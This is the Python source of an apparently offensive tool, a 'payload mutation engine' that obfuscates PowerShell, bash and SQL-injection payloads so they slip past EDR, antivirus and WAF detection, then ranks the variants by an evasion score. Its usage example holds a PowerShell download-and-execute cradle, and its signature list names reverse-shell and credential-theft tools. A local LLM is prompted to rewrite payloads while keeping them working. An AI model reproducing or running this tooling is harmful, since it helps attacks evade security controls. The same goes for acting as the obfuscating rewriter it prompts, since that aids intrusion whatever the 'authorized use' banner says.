"""
╔══════════════════════════════════════════════════════════════════╗
║     ERR0RS ULTIMATE — MODULE 3: Payload Mutation Engine          ║
║                  src/mutation/payload_mutator.py                 ║
║                                                                  ║
║  Takes baseline payloads and generates semantically equivalent   ║
║  but syntactically varied versions that defeat signature-based   ║
║  detection (EDR, WAF, AV, IDS). Runs entirely locally via Ollama.║
║                                                                  ║
║  AUTHORIZED PENETRATION TESTING USE ONLY                         ║
╚══════════════════════════════════════════════════════════════════╝

WHAT THIS DOES (Visual):
────────────────────────
  [Baseline Payload] → e.g. a PowerShell reverse shell
       ↓
  [Mutation Strategies] ← Multiple independent mutation passes
    ├── String Encoding    (Base64, hex, char codes, XOR)
    ├── Variable Renaming  (randomize var names)
    ├── Whitespace Jitter  (insert random whitespace/newlines)
    ├── Comment Injection  (insert random benign comments)
    ├── Control Flow Swap  (if→switch, for→while etc.)
    ├── String Splitting   (break strings into concat chains)
    ├── Null Byte Insertion (between chars in strings)
    └── AI Rewrite         (Ollama rewrites preserving semantics)
       ↓
  [Mutation Variants] ← N unique versions
       ↓
  [Local AV Test] ← Optional: test against local AV engine
       ↓
  [Scored + Ranked Output] ← Highest evasion score first

WHY THIS IS REVOLUTIONARY:
───────────────────────────
  Modern EDR detects known payload signatures instantly.
  Manual obfuscation takes hours per payload.
  This engine generates 10-20 variants in seconds,
  tests them locally, and gives you the highest-probability
  evasion candidate for your authorized engagement.
  The AI rewrite pass is particularly powerful — it
  restructures the entire payload while keeping it functional.
"""

import os
import sys
import re
import json
import random
import base64
import string
import hashlib
import logging
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime

log = logging.getLogger("errors.mutation.payload_mutator")


# ─────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────

class PayloadType(Enum):
    POWERSHELL    = "powershell"
    BASH          = "bash"
    PYTHON        = "python"
    SQL_INJECTION = "sql_injection"
    XSS           = "xss"
    CMD           = "cmd"
    GENERIC       = "generic"


class MutationStrategy(Enum):
    BASE64_ENCODE     = "base64_encode"
    HEX_ENCODE        = "hex_encode"
    CHAR_CODE         = "char_code"
    VAR_RENAME        = "var_rename"
    WHITESPACE_JITTER = "whitespace_jitter"
    COMMENT_INJECT    = "comment_inject"
    STRING_SPLIT      = "string_split"
    CASE_RANDOMIZE    = "case_randomize"
    CONCAT_CHAIN      = "concat_chain"
    AI_REWRITE        = "ai_rewrite"


@dataclass
class PayloadVariant:
    """A single mutated version of a payload."""
    id:               str = field(default_factory=lambda: f"mut_{random.randint(10000,99999)}")
    original_hash:    str = ""
    mutated_payload:  str = ""
    strategies_used:  List[str] = field(default_factory=list)
    payload_type:     PayloadType = PayloadType.GENERIC
    evasion_score:    float = 0.0     # 0.0-1.0 estimated evasion likelihood
    functional:       bool = True     # Does it still do what it's supposed to?
    av_tested:        bool = False
    av_result:        str = ""        # "clean" | "detected" | "error"
    generated_at:     str = field(default_factory=lambda: datetime.now().isoformat())
    notes:            str = ""

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "strategies": self.strategies_used,
            "evasion_score": self.evasion_score,
            "av_result": self.av_result,
            "payload_type": self.payload_type.value,
            "notes": self.notes,
            "payload_preview": self.mutated_payload[:120] + "...",
        }


@dataclass
class MutationResult:
    """Collection of all variants generated for one baseline payload."""
    baseline_hash:  str
    payload_type:   PayloadType
    target_context: str       # What this payload is testing
    variants:       List[PayloadVariant] = field(default_factory=list)
    best_variant:   Optional[PayloadVariant] = None
    generated_at:   str = field(default_factory=lambda: datetime.now().isoformat())

    @property
    def best_evasion_score(self) -> float:
        if not self.variants:
            return 0.0
        return max(v.evasion_score for v in self.variants)

    def to_report(self) -> str:
        lines = [
            f"Mutation Report — {self.payload_type.value}",
            f"Variants generated: {len(self.variants)}",
            f"Best evasion score: {self.best_evasion_score:.2f}",
            f"Context: {self.target_context}",
            "─" * 50,
        ]
        for v in sorted(self.variants, key=lambda x: x.evasion_score, reverse=True):
            av = f" | AV: {v.av_result}" if v.av_tested else ""
            lines.append(f"[{v.id}] Score: {v.evasion_score:.2f}{av} | "
                         f"Strategies: {', '.join(v.strategies_used)}")
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────
# MUTATION STRATEGIES — Individual transformation passes
# ─────────────────────────────────────────────────────────────────

class StringEncoder:
    """Encodes strings within payloads using various methods."""

    @staticmethod
    def base64_wrap_powershell(payload: str) -> str:
        """Wrap PowerShell payload in Base64 encoded execution."""
        encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
        return f"powershell -EncodedCommand {encoded}"

    @staticmethod
    def hex_encode_strings(payload: str) -> str:
        """Replace string literals with hex-encoded equivalents."""
        def hex_replace(match):
            s = match.group(1)
            hex_str = "".join([f"\\x{ord(c):02x}" for c in s])
            return f'"{hex_str}"'
        return re.sub(r'"([^"]{3,})"', hex_replace, payload)

    @staticmethod
    def char_code_strings(payload: str) -> str:
        """Replace strings with char code concatenation (PowerShell/JS)."""
        def char_replace(match):
            s = match.group(1)
            if len(s) > 30:
                return match.group(0)
            chars = "+".join([f"[char]{ord(c)}" for c in s])
            return f"({chars})"
        return re.sub(r'"([^"]{2,20})"', char_replace, payload)

    @staticmethod
    def concat_split(payload: str) -> str:
        """Split long strings into concatenated fragments."""
        def split_string(match):
            s = match.group(1)
            if len(s) < 8:
                return match.group(0)
            mid = len(s) // 2
            return f'"{s[:mid]}"+"' + s[mid:] + '"'
        return re.sub(r'"([^"]{10,})"', split_string, payload)


class VariableObfuscator:
    """Renames variables to random strings to defeat pattern matching."""

    def __init__(self):
        self._var_map: Dict[str, str] = {}

    def _random_var(self, length: int = 8) -> str:
        """Generate a random variable name that looks like a real identifier."""
        prefixes = ["$tmp", "$obj", "$val", "$res", "$buf", "$ptr", "$ctx", "$ref"]
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return random.choice(prefixes) + suffix

    def rename_powershell_vars(self, payload: str) -> str:
        """Find all $VarName occurrences and consistently rename them."""
        var_pattern = re.compile(r'\$([A-Za-z][A-Za-z0-9_]+)')
        found_vars = set(var_pattern.findall(payload))

        # Don't rename PowerShell built-ins
        builtins = {"true", "false", "null", "env", "args", "input",
                    "host", "error", "pwd", "home", "psscriptroot"}
        for var in found_vars:
            if var.lower() not in builtins and var not in self._var_map:
                self._var_map[var] = self._random_var()

        result = payload
        for original, replacement in self._var_map.items():
            result = re.sub(rf'\${re.escape(original)}\b', replacement, result)
        return result


class WhitespaceJitter:
    """Inserts random whitespace that doesn't affect execution."""

    @staticmethod
    def jitter_powershell(payload: str) -> str:
        """Insert valid PowerShell whitespace at random points."""
        lines = payload.split("\n")
        result = []
        for line in lines:
            # Randomly insert extra spaces around operators
            line = re.sub(r'([=+\-|&])', lambda m: f" {m.group()} ", line)
            # Randomly insert blank lines
            if random.random() < 0.2:
                result.append("")
            result.append(line)
        return "\n".join(result)

    @staticmethod
    def jitter_sql(payload: str) -> str:
        """SQL comment-based whitespace jitter."""
        keywords = ["SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "INSERT"]
        result = payload
        for kw in keywords:
            if kw in result:
                # SQL allows /**/ as whitespace
                spaces = "/**/" * random.randint(1, 3)
                result = result.replace(f" {kw} ", f" {spaces}{kw}{spaces} ", 1)
        return result


class CaseRandomizer:
    """Randomizes casing of keywords where case-insensitive languages allow it."""

    @staticmethod
    def randomize_powershell(payload: str) -> str:
        """PowerShell is case-insensitive — randomly capitalize keywords."""
        keywords = ["invoke", "expression", "iex", "downloadstring", "webclient",
                    "new-object", "invoke-webrequest", "system", "net", "shell"]
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def rand_case(match):
                return "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in match.group()
                )
            result = pattern.sub(rand_case, result)
        return result

    @staticmethod
    def randomize_sql(payload: str) -> str:
        """SQL keywords are case-insensitive."""
        keywords = ["select", "from", "where", "union", "or", "and", "null",
                    "information_schema", "tables", "columns"]
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            result = pattern.sub(
                lambda m: "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in m.group()
                ), result
            )
        return result


class CommentInjector:
    """Injects benign comments that break up signature patterns."""

    @staticmethod
    def inject_sql_comments(payload: str) -> str:
        """SQL inline comments /* */ between characters."""
        # Inject between SELECT and col, FROM and table etc.
        keywords = ["SELECT", "UNION", "WHERE", "FROM"]
        result = payload
        for kw in keywords:
            if kw in result.upper():
                new_kw = "".join([c + (f"/**/" if random.random() < 0.3 else "")
                                  for c in kw])
                result = re.sub(kw, new_kw, result, flags=re.IGNORECASE, count=1)
        return result

    @staticmethod
    def inject_ps_comments(payload: str) -> str:
        """PowerShell inline comments <# #>."""
        lines = payload.split("\n")
        result = []
        benign_comments = [
            "<# init #>", "<# check #>", "<# run #>",
            "<# load #>", "<# proc #>", "<# done #>",
        ]
        for line in lines:
            if random.random() < 0.25 and line.strip():
                comment = random.choice(benign_comments)
                line = f"{comment} {line}"
            result.append(line)
        return "\n".join(result)



# ─────────────────────────────────────────────────────────────────
# AI REWRITE STRATEGY — Uses Ollama to intelligently rewrite
# ─────────────────────────────────────────────────────────────────

class AIRewriteStrategy:
    """
    Uses local Ollama to rewrite a payload while preserving its function.
    This is the most powerful mutation strategy — it understands the
    payload semantically and can restructure it completely.
    """

    def __init__(self, model: str = "llama3.2", host: str = "http://localhost:11434"):
        self.model = model
        self.host  = host

    def _available(self) -> bool:
        try:
            import urllib.request
            with urllib.request.urlopen(f"{self.host}/api/tags", timeout=3) as r:
                return r.status == 200
        except Exception:
            return False

    def rewrite(self, payload: str, payload_type: PayloadType) -> Optional[str]:
        """Ask Ollama to rewrite the payload preserving functionality."""
        if not self._available():
            return None

        type_instructions = {
            PayloadType.POWERSHELL: (
                "Rewrite this PowerShell payload using alternative syntax and cmdlets. "
                "Preserve the exact functionality but change the structure, variable names, "
                "and string representations. Use alternative encodings where appropriate."
            ),
            PayloadType.BASH: (
                "Rewrite this bash payload using alternative syntax. "
                "Use different variable names, different quoting styles, and alternative "
                "ways to achieve the same system calls."
            ),
            PayloadType.SQL_INJECTION: (
                "Rewrite this SQL injection payload using alternative syntax. "
                "Use different encodings, comment styles, and equivalent SQL constructs "
                "that achieve the same database interaction."
            ),
            PayloadType.PYTHON: (
                "Rewrite this Python payload using alternative syntax and approaches. "
                "Change variable names, use different built-in functions, "
                "and restructure the code while preserving functionality."
            ),
        }

        instruction = type_instructions.get(
            payload_type,
            "Rewrite this payload using alternative syntax preserving functionality."
        )

        prompt = f"""{instruction}

ORIGINAL PAYLOAD:
{payload}

RULES:
- Output ONLY the rewritten payload code, nothing else
- No explanations, no markdown, no comments about what you changed
- The rewritten payload must achieve exactly the same effect
- Change as much syntax as possible while keeping it functional"""

        try:
            import urllib.request
            req_data = json.dumps({
                "model": self.model,
                "prompt": prompt,
                "stream": False,
                "options": {"num_predict": 500, "temperature": 0.7}
            }).encode()
            req = urllib.request.Request(
                f"{self.host}/api/generate",
                data=req_data,
                headers={"Content-Type": "application/json"}
            )
            with urllib.request.urlopen(req, timeout=60) as r:
                data = json.loads(r.read())
                result = data.get("response", "").strip()
                # Strip any markdown code blocks if present
                result = re.sub(r'```\w*\n?', '', result).strip()
                return result if len(result) > 10 else None
        except Exception as e:
            log.warning(f"AI rewrite failed: {e}")
            return None


# ─────────────────────────────────────────────────────────────────
# EVASION SCORER — Estimates how likely a variant is to evade detection
# ─────────────────────────────────────────────────────────────────

class EvasionScorer:
    """
    Estimates evasion likelihood based on heuristics.
    NOT a substitute for real AV testing — this is a fast pre-filter
    to identify the most promising variants before testing.

    Scoring factors:
    - Signature density: how much of the original high-risk strings remain?
    - Encoding depth: how deeply encoded is the payload?
    - Mutation variety: how many different strategies were applied?
    - Length change: significant length change confuses some static analyzers
    """

    # Known high-risk signature strings by payload type
    SIGNATURES = {
        PayloadType.POWERSHELL: [
            "iex", "invoke-expression", "downloadstring", "webclient",
            "shellcode", "mimikatz", "bypass", "amsi", "reflection",
            "system.net", "encodedcommand",
        ],
        PayloadType.SQL_INJECTION: [
            "union select", "information_schema", "sleep(", "benchmark(",
            "xp_cmdshell", "load_file", "into outfile",
        ],
        PayloadType.BASH: [
            "/bin/sh", "bash -i", "nc -e", "/dev/tcp", "chmod 777",
        ],
        PayloadType.XSS: [
            "<script>", "javascript:", "onerror=", "onload=", "alert(",
        ],
    }

    def score(self, original: str, variant: str,
              payload_type: PayloadType, strategies_used: List[str]) -> float:
        """Return evasion score 0.0-1.0 (higher = better evasion)."""
        score = 0.0

        # Factor 1: Signature reduction (40% of score)
        sigs = self.SIGNATURES.get(payload_type, [])
        if sigs:
            orig_hits = sum(1 for s in sigs if s.lower() in original.lower())
            var_hits  = sum(1 for s in sigs if s.lower() in variant.lower())
            if orig_hits > 0:
                reduction = (orig_hits - var_hits) / orig_hits
                score += reduction * 0.40

        # Factor 2: Encoding depth (30% of score)
        encoding_strategies = {"base64_encode", "hex_encode", "char_code", "concat_chain"}
        encoding_count = sum(1 for s in strategies_used if s in encoding_strategies)
        score += min(encoding_count * 0.10, 0.30)

        # Factor 3: Mutation variety (20% of score)
        variety_score = min(len(strategies_used) / 5.0, 1.0) * 0.20
        score += variety_score

        # Factor 4: Length entropy (10% of score)
        len_delta = abs(len(variant) - len(original)) / max(len(original), 1)
        score += min(len_delta * 0.10, 0.10)

        # Bonus: AI rewrite was used
        if "ai_rewrite" in strategies_used:
            score += 0.15

        return min(score, 1.0)


# ─────────────────────────────────────────────────────────────────
# PAYLOAD MUTATION ENGINE — Main class
# ─────────────────────────────────────────────────────────────────

class PayloadMutationEngine:
    """
    Main mutation engine. Takes a baseline payload and produces N
    unique variants with evasion scoring.

    Usage:
        engine = PayloadMutationEngine()
        result = engine.mutate(
            payload   = "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://...')\"",
            ptype     = PayloadType.POWERSHELL,
            context   = "Testing EDR evasion on Windows 11 target",
            n_variants= 10,
        )
        print(result.to_report())
        best = result.best_variant
        print(best.mutated_payload)
    """

    def __init__(self, ollama_model: str = "llama3.2"):
        self.encoder   = StringEncoder()
        self.obfuscator= VariableObfuscator()
        self.ws_jitter = WhitespaceJitter()
        self.case_rand = CaseRandomizer()
        self.commenter = CommentInjector()
        self.ai_rewrite= AIRewriteStrategy(model=ollama_model)
        self.scorer    = EvasionScorer()

        # Strategy pipeline: ordered list of (strategy_name, callable) per type
        self.strategy_registry = {
            PayloadType.POWERSHELL: [
                (MutationStrategy.VAR_RENAME,       self.obfuscator.rename_powershell_vars),
                (MutationStrategy.CASE_RANDOMIZE,   self.case_rand.randomize_powershell),
                (MutationStrategy.WHITESPACE_JITTER,self.ws_jitter.jitter_powershell),
                (MutationStrategy.COMMENT_INJECT,   self.commenter.inject_ps_comments),
                (MutationStrategy.CHAR_CODE,        self.encoder.char_code_strings),
                (MutationStrategy.CONCAT_CHAIN,     self.encoder.concat_split),
                (MutationStrategy.HEX_ENCODE,       self.encoder.hex_encode_strings),
                (MutationStrategy.BASE64_ENCODE,    self.encoder.base64_wrap_powershell),
            ],
            PayloadType.SQL_INJECTION: [
                (MutationStrategy.CASE_RANDOMIZE,   self.case_rand.randomize_sql),
                (MutationStrategy.WHITESPACE_JITTER,self.ws_jitter.jitter_sql),
                (MutationStrategy.COMMENT_INJECT,   self.commenter.inject_sql_comments),
                (MutationStrategy.CONCAT_CHAIN,     self.encoder.concat_split),
            ],
            PayloadType.BASH: [
                (MutationStrategy.WHITESPACE_JITTER,self.ws_jitter.jitter_powershell),
                (MutationStrategy.VAR_RENAME,       self.obfuscator.rename_powershell_vars),
                (MutationStrategy.CONCAT_CHAIN,     self.encoder.concat_split),
            ],
        }

    def mutate(self, payload: str, ptype: PayloadType = PayloadType.POWERSHELL,
               context: str = "", n_variants: int = 10,
               use_ai: bool = True) -> MutationResult:
        """
        Generate N variants of the payload. Returns scored MutationResult.

        Each variant applies a random subset of strategies.
        One variant always attempts the full pipeline.
        One variant attempts the AI rewrite (if Ollama available).
        """
        original_hash = hashlib.sha256(payload.encode()).hexdigest()[:16]
        result = MutationResult(
            baseline_hash  = original_hash,
            payload_type   = ptype,
            target_context = context,
        )

        strategies = self.strategy_registry.get(ptype, [])
        ai_available = self.ai_rewrite._available()

        log.info(f"[MUTATOR] Generating {n_variants} variants | Type: {ptype.value} | "
                 f"Strategies: {len(strategies)} | AI: {ai_available}")

        for i in range(n_variants):
            variant = self._generate_variant(
                payload, ptype, strategies,
                use_ai=(use_ai and ai_available and i == n_variants - 1)
            )
            if variant:
                result.variants.append(variant)

        if result.variants:
            result.best_variant = max(result.variants, key=lambda v: v.evasion_score)
            log.info(f"[MUTATOR] Best evasion score: {result.best_evasion_score:.2f}")

        return result

    def _generate_variant(self, payload: str, ptype: PayloadType,
                          strategies: list, use_ai: bool) -> Optional[PayloadVariant]:
        """Generate one variant by applying a random strategy combination."""
        try:
            if use_ai:
                rewritten = self.ai_rewrite.rewrite(payload, ptype)
                if rewritten:
                    score = self.scorer.score(payload, rewritten, ptype, ["ai_rewrite"])
                    return PayloadVariant(
                        original_hash   = hashlib.sha256(payload.encode()).hexdigest()[:16],
                        mutated_payload = rewritten,
                        strategies_used = ["ai_rewrite"],
                        payload_type    = ptype,
                        evasion_score   = score,
                        notes           = "AI-rewritten variant",
                    )

            # Pick a random subset of strategies (2-5 strategies per variant)
            n_strats = random.randint(2, min(5, len(strategies)))
            chosen = random.sample(strategies, n_strats)

            current = payload
            applied = []
            for strategy_enum, strategy_fn in chosen:
                try:
                    mutated = strategy_fn(current)
                    if mutated and mutated != current:
                        current = mutated
                        applied.append(strategy_enum.value)
                except Exception as e:
                    log.debug(f"Strategy {strategy_enum.value} failed: {e}")

            if not applied:
                return None

            score = self.scorer.score(payload, current, ptype, applied)
            return PayloadVariant(
                original_hash   = hashlib.sha256(payload.encode()).hexdigest()[:16],
                mutated_payload = current,
                strategies_used = applied,
                payload_type    = ptype,
                evasion_score   = score,
            )
        except Exception as e:
            log.error(f"Variant generation failed: {e}")
            return None

    def save_variants(self, result: MutationResult, output_dir: str = "./mutations"):
        """Save all variants to disk for later use."""
        from pathlib import Path
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = out / f"mutation_report_{result.baseline_hash}_{timestamp}.json"
        report_data = {
            "generated_at":    result.generated_at,
            "payload_type":    result.payload_type.value,
            "context":         result.target_context,
            "n_variants":      len(result.variants),
            "best_score":      result.best_evasion_score,
            "variants":        [v.to_dict() for v in result.variants],
            "best_variant_id": result.best_variant.id if result.best_variant else None,
        }
        report_path.write_text(json.dumps(report_data, indent=2))

        # Save the best variant payload separately
        if result.best_variant:
            best_path = out / f"best_{result.baseline_hash}_{timestamp}.txt"
            best_path.write_text(result.best_variant.mutated_payload)
            log.info(f"[MUTATOR] Best variant saved: {best_path}")

        log.info(f"[MUTATOR] Report saved: {report_path}")
        return str(report_path)


__all__ = [
    "PayloadMutationEngine", "MutationResult", "PayloadVariant",
    "PayloadType", "MutationStrategy",
    "StringEncoder", "VariableObfuscator", "EvasionScorer",
]
